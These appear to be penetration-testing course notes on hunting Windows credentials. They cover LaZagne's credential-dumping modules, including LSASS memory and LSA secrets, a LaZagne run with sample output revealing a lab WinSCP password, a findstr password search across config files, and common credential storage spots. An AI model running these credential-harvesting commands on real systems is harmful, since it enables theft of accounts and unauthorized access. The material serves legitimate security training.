# Search Tools
## Windows Search
![image 351.png](../../assets/Credential%20Hunting%20in%20Windows/image%20351.png)
  
## LaZagne
- quickly discovers credentials that web browsers or other apps may insecurely store
- made up of modules which each target different software
|**Module**|**Description**|
|---|---|
|browsers|Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera|
|chats|Extracts passwords from various chat applications including Skype|
|mails|Searches through mailboxes for passwords including Outlook and Thunderbird|
|memory|Dumps passwords from memory, targeting KeePass and LSASS|
|sysadmin|Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP|
|windows|Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more|
|wifi|Dumps WiFi credentials|
  
```Markdown
start LaZagne.exe all
```
- executes all modules
- can use `-vv` to study what exactly it’s doing
```Markdown
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: bob ##########
------------------- Winscp passwords -----------------
[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```
  
## findstr
```Markdown
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
  
# Additional Considerations
- passwords in Group Policy stored in SYSVOL
- passwords in scripts in SYSVOL
- passwords in scripts in IT shares
- passwords in web.config files on dev machines and IT shares
- password in unattend.xml
- passwords in AD user or computer description fields
- KeePass databases
- found on user systems and shares
- files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint